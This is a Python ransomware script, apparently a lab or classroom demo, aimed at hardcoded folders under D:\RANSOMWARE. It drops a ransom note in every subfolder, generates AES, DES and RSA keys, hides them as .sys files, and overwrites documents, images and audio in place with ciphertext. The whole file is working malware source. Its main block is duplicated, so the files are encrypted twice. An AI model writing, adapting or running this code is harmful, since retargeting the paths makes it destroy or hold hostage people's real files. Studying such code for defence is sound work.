import os
import ctypes
from Crypto.Cipher import AES, DES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

SOURCE_FOLDERS = [
    r"D:\RANSOMWARE\documenation",
    r"D:\RANSOMWARE\photos",
    r"D:\RANSOMWARE\songs"
]

# === Helper to save file as hidden on Windows ===
def save_hidden(filepath, data):
    with open(filepath, "wb") as f:
        f.write(data)
    if os.name == 'nt':  # Windows only
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(filepath, FILE_ATTRIBUTE_HIDDEN)

# === Create Readme.txt with ransom message in every source folder and subfolder ===
def create_ransom_readme():
    message = (
        "Your files have been encrypted!\n"
        "To decrypt your files, use the code: 2004\n"
    )
    for folder in SOURCE_FOLDERS:
        for root, dirs, files in os.walk(folder):
            readme_path = os.path.join(root, "Readme.txt")
            try:
                with open(readme_path, "w", encoding="utf-8") as f:
                    f.write(message)
                print(f"📢 Readme created: {readme_path}")
            except Exception as e:
                print(f"⚠ Could not create Readme in {root}: {e}")

# === Key generation ===
aes_key = get_random_bytes(16)
des_key = get_random_bytes(8)
rsa_key = RSA.generate(2048)
public_key = rsa_key.publickey()

KEYS_FOLDER = r"D:\Keys"
os.makedirs(KEYS_FOLDER, exist_ok=True)

save_hidden(os.path.join(KEYS_FOLDER, ".aes_key.sys"), aes_key)
save_hidden(os.path.join(KEYS_FOLDER, ".des_key.sys"), des_key)
save_hidden(os.path.join(KEYS_FOLDER, ".rsa_private.sys"), rsa_key.export_key())
save_hidden(os.path.join(KEYS_FOLDER, ".rsa_public.sys"), public_key.export_key())
# === Encryption Functions ===
def encrypt_aes(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_path, 'rb') as f:
        data = f.read()
    ciphertext = cipher.iv + cipher.encrypt(pad(data, AES.block_size))
    return ciphertext

def encrypt_des(file_path, key):
    cipher = DES.new(key, DES.MODE_CBC)
    with open(file_path, 'rb') as f:
        data = f.read()
    ciphertext = cipher.iv + cipher.encrypt(pad(data, DES.block_size))
    return ciphertext

def encrypt_rsa_hybrid(file_path, pub_key):
    aes_key_local = get_random_bytes(16)
    iv = get_random_bytes(16)
    aes_cipher = AES.new(aes_key_local, AES.MODE_CBC, iv)
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = aes_cipher.encrypt(pad(data, AES.block_size))
    rsa_cipher = PKCS1_OAEP.new(RSA.import_key(pub_key))
    encrypted_key_iv = rsa_cipher.encrypt(aes_key_local + iv)
    return encrypted_key_iv + encrypted_data


def encrypt_all_files():
    for root_folder in SOURCE_FOLDERS:
        for root, dirs, files in os.walk(root_folder):
            for filename in files:
                if filename == "Readme.txt":
                    print(f"ℹ️ Skipping ransom note file: {os.path.join(root, filename)}")
                    continue  # Do NOT encrypt the ransom note!

                src_path = os.path.join(root, filename)
                ext = filename.split('.')[-1].lower()
                try:
                    if ext in ['txt', 'csv', 'json', 'jpg', 'jpeg', 'png']:
                        encrypted = encrypt_aes(src_path, aes_key)
                    elif ext in ['mp3', 'wav']:
                        encrypted = encrypt_des(src_path, des_key)
                    elif ext in ['docx', 'pptx']:
                        encrypted = encrypt_rsa_hybrid(src_path, public_key.export_key())
                    else:
                        print(f"❌ Skipped (unsupported): {src_path}")
                        continue

                    with open(src_path, 'wb') as f:
                        f.write(encrypted)
                    print(f"✅ Encrypted (in place): {src_path}")
                except Exception as e:
                    print(f"⚠ Error encrypting {src_path}: {e}")

if __name__ == "__main__":
    create_ransom_readme()  # create ransom note(s) first
    encrypt_all_files()     # then encrypt all files, skipping ransom note
    print("\n🎉 All supported files have been encrypted in place!")
    print("🗝️ Encryption keys are saved in hidden files:")
    print("   .aes_key.sys, .des_key.sys, .rsa_private.sys, .rsa_public.sys")

if __name__ == "__main__":
    create_ransom_readme()
    encrypt_all_files()
    print("\n🎉 All supported files have been encrypted in place!")
    print("🗝️ Encryption keys are saved in hidden files:")
    print("   .aes_key.sys, .des_key.sys, .rsa_private.sys, .rsa_public.sys")